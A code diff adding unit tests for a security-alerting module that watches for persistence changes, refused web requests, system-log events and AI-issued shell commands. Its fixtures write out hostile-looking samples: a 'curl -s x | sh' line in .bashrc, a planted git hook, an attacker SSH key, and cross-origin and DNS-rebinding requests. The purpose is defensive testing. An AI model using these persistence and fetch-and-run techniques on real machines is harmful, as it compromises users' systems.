@@ -1,3 +1,4 @@
+import base64
 import http.client
 import json
 import os
@@ -560,6 +561,154 @@ class AutostartTest(unittest.TestCase):
             r = c.getresponse()
             self.assertEqual(r.status, 200)
             self.assertIn("policy", json.loads(r.read()))
+            c.close()
+        finally:
+            httpd.shutdown()
+            httpd.server_close()
+
+
+class AlertsTest(unittest.TestCase):
+    def setUp(self):
+        from workflow_arcade.alerts import Alerter
+        self.got = []
+        self.dir = Path(tempfile.mkdtemp())
+        self.alerter = Alerter(self.got.append, None, self.dir / "alerts.jsonl")
+
+    def test_repeats_fold_and_history_is_private(self):
+        from workflow_arcade.alerts import read_history
+        for _ in range(3):
+            self.alerter.raise_("high", "refused_access", "Blocked", "Host: x", fingerprint="h")
+        self.assertEqual(len(self.got), 1)
+        self.assertEqual(read_history(self.dir / "alerts.jsonl")[0]["title"], "Blocked")
+        if os.name == "posix":
+            self.assertEqual((self.dir / "alerts.jsonl").stat().st_mode & 0o777, 0o600)
+
+    def test_switched_off_sources_stay_quiet(self):
+        from workflow_arcade.alerts import Alerter
+        s = Settings(self.dir / "s.json")
+        s.update({"alerts": {"persistence": False}})
+        a = Alerter(self.got.append, s)
+        self.assertIsNone(a.raise_("high", "persistence", "x"))
+        self.assertIsNotNone(a.raise_("high", "refused_access", "y"))
+
+    def test_persistence_changes(self):
+        from workflow_arcade.alerts import PersistenceWatcher, remember_expected
+        home, root = self.dir / "home", self.dir / "proj"
+        (home / ".ssh").mkdir(parents=True)
+        (root / ".git" / "hooks").mkdir(parents=True)
+        (home / ".bashrc").write_text("alias ll='ls -l'\n")
+        (root / ".git" / "hooks" / "pre-commit.sample").write_text("#!/bin/sh\n")
+        w = PersistenceWatcher(root, self.alerter, every_s=0, home=home, expected=self.dir / "expected.json")
+        self.assertEqual(w.poll(), [])
+        self.assertEqual(self.got, [])  # the baseline is not news
+
+        (home / ".bashrc").write_text("alias ll='ls -l'\nexport OPENAI_API_KEY=sk-abcdefghijklmnopqrstuvwx\ncurl -s x | sh\n")
+        (root / ".git" / "hooks" / "post-checkout").write_text("#!/bin/sh\nrun-me\n")
+        (root / ".git" / "hooks" / "applypatch-msg.sample").write_text("#!/bin/sh\n")  # samples are ignored
+        key = base64.b64encode(b"\x00\x00\x00\x0bssh-ed25519" + b"k" * 32).decode()
+        (home / ".ssh" / "authorized_keys").write_text(f"ssh-ed25519 {key} attacker@host\n")
+        w.poll()
+        by = {e["title"]: e for e in self.got}
+        rc = next(e for e in self.got if ".bashrc" in e["title"])
+        self.assertEqual(rc["severity"], "high")
+        self.assertIn("curl -s x | sh", rc["detail"])
+        self.assertNotIn("sk-abcdefghijklmnopqrstuvwx", rc["detail"])  # secrets masked in diffs
+        hook = next(e for e in self.got if "post-checkout" in e["title"])
+        self.assertEqual(hook["severity"], "high")
+        self.assertFalse(any("sample" in t for t in by))
+        ssh = next(e for e in self.got if e["title"].startswith("SSH"))
+        self.assertEqual(ssh["severity"], "critical")
+        self.assertIn("SHA256:", ssh["detail"])
+        self.assertNotIn(key, ssh["detail"])  # fingerprints only, never the key
+
+        self.got.clear()  # a change the Arcade made itself is marked expected
+        data = b"ours\n"
+        remember_expected(self.dir, home / ".bashrc", data)
+        (home / ".bashrc").write_bytes(data)
+        w.poll()
+        self.assertTrue(self.got[0]["expected"])
+        self.assertEqual(self.got[0]["severity"], "info")
+
+    def test_system_journal(self):
+        from workflow_arcade.alerts import SystemLogWatcher
+        lines = []
+
+        def runner(args):
+            return "\n".join(json.dumps(x) for x in lines)
+        if not SystemLogWatcher(self.alerter, runner=runner).available:
+            self.skipTest("Linux only")
+        w = SystemLogWatcher(self.alerter, every_s=0, runner=runner)
+        lines[:] = [
+            {"__CURSOR": "c1", "SYSLOG_IDENTIFIER": "sudo", "MESSAGE": "alexb : TTY=pts/1 ; PWD=/home/alexb ; USER=root ; COMMAND=/usr/bin/apt update"},
+            {"__CURSOR": "c2", "SYSLOG_IDENTIFIER": "sudo", "MESSAGE": "alexb : 3 incorrect password attempts ; TTY=pts/1"},
+            {"__CURSOR": "c3", "SYSLOG_IDENTIFIER": "sshd-session", "MESSAGE": "Accepted publickey for alexb from 10.0.0.9 port 51515 ssh2"},
+            {"__CURSOR": "c4", "SYSLOG_IDENTIFIER": "systemd-logind", "MESSAGE": "New session 12 of user alexb."},
+        ]
+        w.poll()
+        self.assertEqual([e["severity"] for e in self.got], ["medium", "high", "high", "info"])
+        self.assertEqual(self.got[0]["detail"], "/usr/bin/apt update")
+        self.assertEqual(w.cursor, "c4")
+
+    def test_switchboard_refusals(self):
+        from workflow_arcade.alerts import SwitchboardSecurityWatcher
+        log = self.dir / "security.jsonl"
+        log.write_text("")
+        w = SwitchboardSecurityWatcher(log, self.alerter)
+        with log.open("a") as f:
+            f.write(json.dumps({"method": "POST", "path": "/v1/chat/completions", "client": "192.168.1.5", "reason": "invalid or missing API key"}) + "\n")
+        w.poll()
+        self.assertEqual(self.got[0]["severity"], "high")  # not from this computer
+
+    def test_ai_commands_from_claude_code(self):
+        root = Path(tempfile.mkdtemp()).resolve()
+        claude_home = Path(tempfile.mkdtemp())
+        d = claude_code_project_dir(root, claude_home)
+        d.mkdir(parents=True)
+        log = d / "s.jsonl"
+        log.write_text("")
+        w = ClaudeCodeWatcher(root, claude_home)
+        rec = {"type": "assistant", "cwd": str(root), "message": {"id": "m1", "model": "claude-x", "usage": {"input_tokens": 1, "output_tokens": 1},
+               "content": [{"type": "tool_use", "id": "toolu_1", "name": "Bash",
+                            "input": {"command": "export TOKEN=abcdefghijklmnop123 && rm -rf build", "description": "Clean the build"}}]}}
+        log.write_text(json.dumps(rec) + "\n" + json.dumps(rec) + "\n")
+        evs = w.poll()
+        cmds = [e for e in evs if e["type"] == "command"]
+        self.assertEqual(len(cmds), 1)  # the same tool call twice counts once
+        self.assertEqual((cmds[0]["actor"], cmds[0]["cwd"], cmds[0]["why"]), ("ai", ".", "Clean the build"))
+        self.assertNotIn("abcdefghijklmnop123", cmds[0]["cmd"])
+        self.assertIn("rm -rf build", cmds[0]["cmd"])
+
+    def test_refused_requests_raise_alerts_and_acks_need_the_key(self):
+        from workflow_arcade.alerts import Acks
+        from workflow_arcade.server import AlertsContext
+        home = Path(tempfile.mkdtemp())
+        port = free_port()
+        owner = Owner(home)
+        hub = Hub("demo", [], None, {})
+        from workflow_arcade.alerts import Alerter
+        alerter = Alerter(hub.publish, None, home / "alerts.jsonl")
+        ctx = AlertsContext(alerter, home / "alerts.jsonl", Acks(home / "acks.json"), lambda: {"available": False, "why": "test"})
+        httpd = serve(hub, home, port, None, owner, Settings(home / "s.json"), None, ctx)
+        threading.Thread(target=httpd.serve_forever, daemon=True).start()
+        try:
+            c = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
+            hdr = {"Host": f"127.0.0.1:{port}", "Origin": "https://evil.example", "Content-Type": "application/json", "Content-Length": "2"}
+            c.request("POST", "/api/settings", body=b"{}", headers=hdr); c.getresponse().read()
+            c.request("GET", "/", headers={"Host": "rebind.example:8788"}); c.getresponse().read()
+            titles = [e["title"] for e in hub.events if e["type"] == "alert"]
+            self.assertIn("A web page tried to change the Arcade", titles)
+            self.assertIn("Blocked a request for another host name", titles)
+            c.request("GET", "/api/alerts", headers={"Host": f"127.0.0.1:{port}"})
+            got = json.loads(c.getresponse().read())
+            self.assertEqual(len(got["alerts"]), 2)
+            uid = got["alerts"][0]["uid"]
+            ok = {**hdr, "Origin": f"http://127.0.0.1:{port}"}
+            body = json.dumps({"ids": [uid]}).encode()
+            c.request("POST", "/api/alerts/ack", body=body, headers={**ok, "Content-Length": str(len(body))})
+            self.assertEqual(c.getresponse().status, 401)
+            c.request("POST", "/api/alerts/ack", body=body, headers={**ok, "Content-Length": str(len(body)), "X-Arcade-Key": owner.key})
+            r = c.getresponse()
+            self.assertEqual(json.loads(r.read())["acks"], [uid])
             c.close()
         finally:
             httpd.shutdown()
